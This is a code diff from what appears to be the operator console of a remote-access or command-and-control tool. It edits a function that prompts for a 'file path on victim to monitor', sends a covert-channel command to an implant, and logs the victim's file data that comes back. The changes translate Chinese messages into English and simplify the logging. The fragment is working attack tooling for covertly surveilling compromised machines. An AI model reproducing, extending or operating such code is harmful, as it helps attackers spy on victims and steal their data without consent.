@@ -297,15 +297,13 @@ def cmd_monitor_file(comm: Commander):
     file_path = input("Enter file path on victim to monitor: ").strip()
     date_str = datetime.now().strftime("%Y-%m-%d")
     log_filename = f"{date_str}.log"
-    print(f"[*] 开始监控文件：{file_path}。日志保存为 {log_filename}，按 Ctrl+C 停止。")
+    print(f"Start Monitor ：{file_path}。Log file save to {log_filename}，Ctrl+C Stop")
     comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())
 
     with open(log_filename, "a", encoding="utf-8") as logfile:
         try:
-            # 缓冲区，存放尚未以 '\n' 分割的残余数据
             buffer = ""
 
-            # 先接收一次启动确认，放到 buffer 里
             resp = comm.recv_covert_message()
             if resp:
                 buffer += resp.decode('utf-8', errors='ignore')
@@ -314,26 +312,16 @@ def cmd_monitor_file(comm: Commander):
                 data = comm.recv_covert_message()
                 if data is None:
                     continue
-                # 先打个调试
+
                 print("[DEBUG raw data]:", data)
                 text = data.decode(errors="ignore")
-                # 尝试当 JSON 解析
-                try:
-                    msg = json.loads(text)
-                    # 标准 JSON 事件
-                    print(f"[{msg['timestamp']}] 事件 {msg['type']} | {msg.get('path', '')}")
-                    if 'content' in msg:
-                        print(msg['content'])
-                    print("-" * 40)
-                    logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
-                except json.JSONDecodeError:
-                    # 非 JSON 文本也记录，以防万一
-                    print("[DEBUG] 非 JSON 消息:", text.strip())
-                    logfile.write(text + "\n")
+                print("[DEBUG] Message:", text.strip())
+
+                logfile.write(text + "\n")
                 logfile.flush()
 
         except KeyboardInterrupt:
-            print("\n[*] 停止文件监控。")
+            print("\n[*] Stopping File Watching")
             comm.send_covert_message(b"CMD_STOP_MON_FILE")
 
 
